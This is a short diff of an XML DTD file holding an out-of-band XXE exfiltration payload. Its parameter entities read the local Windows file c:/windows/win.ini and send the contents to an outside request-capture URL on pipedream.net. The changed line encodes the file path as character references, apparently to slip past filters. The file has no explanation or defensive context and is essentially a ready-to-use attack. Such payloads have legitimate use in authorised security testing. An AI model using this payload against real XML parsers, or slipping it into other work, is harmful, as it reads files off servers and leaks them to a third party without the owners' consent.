@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8" ?>
-<!ENTITY % file "<!ENTITY &#x25; file2 SYSTEM 'file:///c:/windows/win.ini'>">
+<!ENTITY % file "<!ENTITY &#x25; file2 SYSTEM 'file&#x3a;&#x2f;&#x2f;&#x2f;c&#x3a;&#x2f;windows&#x2f;win.ini'>">
 <!ENTITY % exfil "<!ENTITY &#x25; exfil2 SYSTEM 'https://enllfgxx7hk1e.x.pipedream.net/?dt=%file;'>">
 %file;
 %file2;
